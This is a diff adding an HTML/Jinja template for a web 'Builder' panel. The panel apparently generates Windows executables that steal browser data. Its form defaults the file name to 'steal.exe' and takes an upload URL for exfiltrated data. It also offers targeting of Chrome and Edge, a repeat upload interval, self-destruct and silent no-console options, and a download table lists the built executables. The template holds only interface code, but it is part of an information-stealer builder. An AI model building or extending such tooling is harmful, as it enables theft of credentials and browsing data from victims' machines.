@@ -1,0 +1,109 @@
+{% extends "base.html" %}
+{% block title %}Builder{% endblock %}
+{% block content %}
+<div class="space-y-8 py-8">
+    <h1 class="text-4xl font-bold text-center">Builder</h1>
+
+    <!-- Builder Form -->
+    <div class="flex justify-center">
+        <div class="card bg-base-200 shadow-xl w-full max-w-md">
+            <div class="card-body">
+                <!-- Flash Messages -->
+                {% with messages = get_flashed_messages(with_categories=true) %}
+                    {% if messages %}
+                        <div id="flash-message" class="alert alert-{{ messages[0][0] }} mb-4">
+                            {{ messages[0][1] }}
+                        </div>
+                    {% endif %}
+                {% endwith %}
+                <form method="POST" class="space-y-6">
+                    <div class="form-control">
+                        <label class="label">
+                            <span class="label-text text-lg">Executable Name</span>
+                        </label>
+                        <input type="text" name="exe_name" value="steal.exe" class="input input-bordered w-full" required pattern="[a-zA-Z0-9_-]+\.exe" title="Name must end with .exe and contain only letters, numbers, underscores, or hyphens">
+                    </div>
+                    <div class="form-control">
+                        <label class="label">
+                            <span class="label-text text-lg">Upload URL</span>
+                        </label>
+                        <input type="text" name="upload_url" placeholder="http://example.com/upload" class="input input-bordered w-full" required>
+                    </div>
+                    <div class="form-control">
+                        <label class="label">
+                            <span class="label-text text-lg">Target Browser</span>
+                        </label>
+                        <select name="target_browser" class="select select-bordered w-full">
+                            <option value="0">Chrome only</option>
+                            <option value="1">Edge only</option>
+                            <option value="2" selected>Both Chrome and Edge</option>
+                        </select>
+                    </div>
+                    <div class="form-control">
+                        <label class="label">
+                            <span class="label-text text-lg">Upload Interval (hours, 0 for one-time)</span>
+                        </label>
+                        <input type="number" name="upload_interval" min="0" value="0" class="input input-bordered w-full" required>
+                    </div>
+                    <div class="form-control">
+                        <label class="label cursor-pointer">
+                            <span class="label-text text-lg">Enable Self-Destruct</span>
+                            <input type="checkbox" name="self_destruct" class="checkbox checkbox-primary">
+                        </label>
+                    </div>
+                    <div class="form-control">
+                        <label class="label cursor-pointer">
+                            <span class="label-text text-lg">Run Silently (No Console)</span>
+                            <input type="checkbox" name="silent" class="checkbox checkbox-primary">
+                        </label>
+                    </div>
+                    <button type="submit" class="btn btn-primary w-full hover:btn-accent transition-colors">Build Executable</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- Built Executables Table -->
+    <div class="flex justify-center">
+        <div class="card bg-base-200 shadow-xl w-full max-w-4xl">
+            <div class="card-body">
+                <h2 class="text-2xl font-semibold">Built Executables</h2>
+                {% if exe_files %}
+                    <div class="overflow-x-auto">
+                        <table class="table w-full">
+                            <thead>
+                                <tr>
+                                    <th>Executable Name</th>
+                                    <th>Download</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                {% for exe in exe_files %}
+                                <tr>
+                                    <td>{{ exe }}</td>
+                                    <td><a href="{{ url_for('serve_file', filename='builds/' + exe) }}" class="btn btn-sm btn-primary">Download</a></td>
+                                </tr>
+                                {% endfor %}
+                            </tbody>
+                        </table>
+                    </div>
+                {% else %}
+                    <p class="text-gray-500">No executables built yet.</p>
+                {% endif %}
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- JavaScript to hide flash message after 5 seconds -->
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+        const flashMessage = document.getElementById('flash-message');
+        if (flashMessage) {
+            setTimeout(function() {
+                flashMessage.style.display = 'none';
+            }, 5000);
+        }
+    });
+</script>
+{% endblock %}
